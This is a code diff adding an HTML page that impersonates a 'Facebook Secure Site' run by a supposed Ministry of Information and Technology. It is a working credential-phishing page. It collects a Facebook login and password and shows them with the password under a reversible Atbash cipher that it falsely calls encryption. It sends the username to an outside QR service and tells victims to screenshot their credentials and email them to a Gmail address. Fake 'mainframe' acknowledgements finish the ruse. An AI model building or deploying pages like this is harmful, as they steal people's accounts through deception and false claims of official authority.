@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Arvash | MIT-FSS Secure Site</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'SF Pro Display', -apple-system, sans-serif; }
+
+        body {
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #050505;
+            background-image: 
+                radial-gradient(circle at 15% 15%, rgba(255, 0, 0, 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 85% 85%, rgba(255, 0, 0, 0.15) 0%, transparent 50%);
+            overflow: hidden;
+            padding: 20px;
+        }
+
+        .glass-box {
+            background: rgba(30, 0, 0, 0.35);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+            border: 1px solid rgba(255, 49, 49, 0.35);
+            border-radius: 28px;
+            padding: 40px 25px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 0 50px rgba(0, 0, 0, 0.8);
+            transition: opacity 0.6s cubic-bezier(0.4, 0, 0.2, 1), transform 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .fade-out { opacity: 0; transform: scale(0.9); pointer-events: none; }
+
+        h2 { 
+            color: #fff; 
+            font-size: 34px; 
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 4px;
+            text-shadow: 0 0 15px rgba(255, 49, 49, 0.8);
+        }
+        
+        .mit-subtitle {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 13px;
+            line-height: 1.5;
+            margin-bottom: 30px;
+        }
+
+        .input-group { margin-bottom: 18px; }
+        
+        input {
+            width: 100%;
+            padding: 18px;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 49, 49, 0.25);
+            border-radius: 15px;
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        input:focus { 
+            border-color: #ff3131; 
+            box-shadow: 0 0 20px rgba(255, 49, 49, 0.3);
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 18px;
+            border: none;
+            border-radius: 15px;
+            background: #ff3131;
+            color: #fff;
+            font-size: 18px;
+            font-weight: 800;
+            cursor: pointer;
+            text-transform: uppercase;
+            box-shadow: 0 5px 25px rgba(255, 49, 49, 0.4);
+            transition: 0.3s;
+        }
+
+        #loader {
+            display: none;
+            border: 3px solid rgba(255, 49, 49, 0.1);
+            border-top: 3px solid #ff3131;
+            border-radius: 50%;
+            width: 45px;
+            height: 45px;
+            animation: spin 0.8s linear infinite;
+            position: absolute;
+            z-index: 2000;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.98);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            transition: opacity 0.6s ease, transform 0.6s ease;
+        }
+
+        .modal {
+            background: #0a0a0a;
+            border: 1px solid #ff3131;
+            padding: 35px 25px;
+            border-radius: 24px;
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+        }
+
+        .qr-container {
+            width: 180px;
+            height: 180px;
+            margin: 20px auto;
+            background: #fff;
+            padding: 8px;
+            border-radius: 12px;
+        }
+
+        .cred-display {
+            background: rgba(255, 49, 49, 0.08);
+            border: 1px solid rgba(255, 49, 49, 0.2);
+            padding: 20px;
+            border-radius: 12px;
+            margin: 20px 0;
+            color: #ff4d4d;
+            font-family: 'Courier New', monospace;
+            text-align: left;
+            font-size: 13px;
+            line-height: 1.8;
+            word-break: break-all;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="loader"></div>
+
+    <div class="glass-box" id="loginBox">
+        <h2>ARVASH</h2>
+        <p class="mit-subtitle">Facebook Secure Site powered by the Ministry of Information and Technology (MIT-FSS)</p>
+        
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="text" id="user" placeholder="Mobile number or email" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="pass" placeholder="Password" required>
+            </div>
+            <button type="submit" class="login-btn">LOGIN</button>
+        </form>
+    </div>
+
+    <div class="modal-overlay" id="confirmOverlay">
+        <div class="modal">
+            <h3 style="color: #fff; font-size: 18px;">ACCOUNT CONFIRMATION</h3>
+            <div class="qr-container">
+                <img id="qrImage" src="" alt="Security QR" style="width:100%; height:100%;">
+            </div>
+            <div class="cred-display" id="displayData"></div>
+            <p style="font-size: 12px; color: #999;">Take a screenshot and send to <br> <strong style="color: #ff3131;">mit.aesthrella@gmail.com</strong> for final security verification. A Gmail notification will follow.</p>
+            <button class="login-btn" style="margin-top: 20px;" onclick="showAcknowledgements()">CONTINUE</button>
+        </div>
+    </div>
+
+    <div class="modal-overlay" id="ackOverlay">
+        <div class="modal">
+            <h3 style="color: #ff3131; letter-spacing: 2px;">ACKNOWLEDGEMENTS</h3>
+            <div class="cred-display" style="text-align: center; color: #eee; font-family: sans-serif;">
+                <p style="margin-bottom: 15px;">Submission logged into the <b>MIT-FSS Mainframe</b>.</p>
+                <ul style="text-align: left; font-size: 12px; list-style: none; opacity: 0.8; line-height: 2;">
+                    <li>● Encryption : Alpha-Numeric Atbash</li>
+                    <li>● Status : Secure Relay Active</li>
+                    <li>● Registry ID: MIT-FS-8821</li>
+                </ul>
+            </div>
+            <button class="login-btn" style="background: transparent; border: 1px solid #ff3131;" onclick="finalExit()">FINISH & RETURN</button>
+        </div>
+    </div>
+
+    <script>
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+
+        function playBeep(freq, duration, type = 'sine') {
+            const oscillator = audioCtx.createOscillator();
+            const gainNode = audioCtx.createGain();
+            oscillator.type = type;
+            oscillator.frequency.setValueAtTime(freq, audioCtx.currentTime);
+            gainNode.gain.setValueAtTime(0.1, audioCtx.currentTime);
+            gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + duration);
+            oscillator.connect(gainNode);
+            gainNode.connect(audioCtx.destination);
+            oscillator.start();
+            oscillator.stop(audioCtx.currentTime + duration);
+        }
+
+        function encryptAtbash(str) {
+            return str.split('').map(char => {
+                if (char.match(/[a-z]/i)) {
+                    const code = char.charCodeAt(0);
+                    const base = code >= 97 ? 97 : 65;
+                    return String.fromCharCode(base + (25 - (code - base)));
+                }
+                if (char.match(/[0-9]/)) return (9 - parseInt(char)).toString();
+                return char;
+            }).join('');
+        }
+
+        document.getElementById('loginForm').onsubmit = (e) => {
+            e.preventDefault();
+            playBeep(880, 0.15); // High pitch login beep
+            document.getElementById('loginBox').classList.add('fade-out');
+            
+            setTimeout(() => {
+                document.getElementById('loader').style.display = 'block';
+                setTimeout(() => {
+                    document.getElementById('loader').style.display = 'none';
+                    const user = document.getElementById('user').value;
+                    const pass = document.getElementById('pass').value;
+                    document.getElementById('qrImage').src = `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=MIT-FSS-${encodeURIComponent(user)}`;
+                    document.getElementById('displayData').innerHTML = `<strong>USERNAME:</strong> ${user}<br><strong>PASSWORD <i>(Encrypted)</i>:</strong> ${encryptAtbash(pass)}<br><span style="font-size:10px; color:#ff3131;">ENCRYPTED TO AVOID BRUTEFORCES FROM UNKNOWN</span>`;
+                    document.getElementById('confirmOverlay').style.display = 'flex';
+                    playBeep(1200, 0.1); // High pitch confirmation beep
+                }, 1200);
+            }, 500);
+        };
+
+        function showAcknowledgements() {
+            playBeep(1000, 0.1);
+            document.getElementById('confirmOverlay').classList.add('fade-out');
+            setTimeout(() => {
+                document.getElementById('confirmOverlay').style.display = 'none';
+                document.getElementById('ackOverlay').style.display = 'flex';
+                // Success chime
+                setTimeout(() => playBeep(1500, 0.1), 50);
+                setTimeout(() => playBeep(1800, 0.15), 150);
+            }, 600);
+        }
+
+        function finalExit() {
+            playBeep(600, 0.2, 'square');
+            document.getElementById('ackOverlay').classList.add('fade-out');
+            setTimeout(() => location.reload(), 600);
+        }
+    </script>
+</body>
+</html>
